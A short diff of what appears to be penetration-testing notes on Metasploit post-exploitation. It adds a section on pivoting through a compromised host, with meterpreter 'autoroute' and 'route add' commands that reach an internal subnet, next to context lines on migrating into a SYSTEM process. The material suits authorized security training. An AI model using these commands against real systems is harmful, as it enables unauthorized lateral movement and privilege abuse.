@@ -93,3 +93,18 @@ meterpreter> getpid
 meterpreter> ps -U SYSTEM //process with system privilege, choose one
 meterpreter> migrate PID
 ```
+# PIVOTING
+When we get access into a machine, we can check with ifconfig if there is another network which we couldn't access.
+So let add the route to this network in msfconsole.
+```
+meterpreter> run autoroute -h
+```
+autoroute allow us to add a route to the network.
+```
+route add 192.69.228.0 255.255.255.0 1
+```
+for adding manually a route on msfconsole:
+add //the command
+subnet //subnet to connect
+netmask //netmask of the subned
+sid //meterpter session id
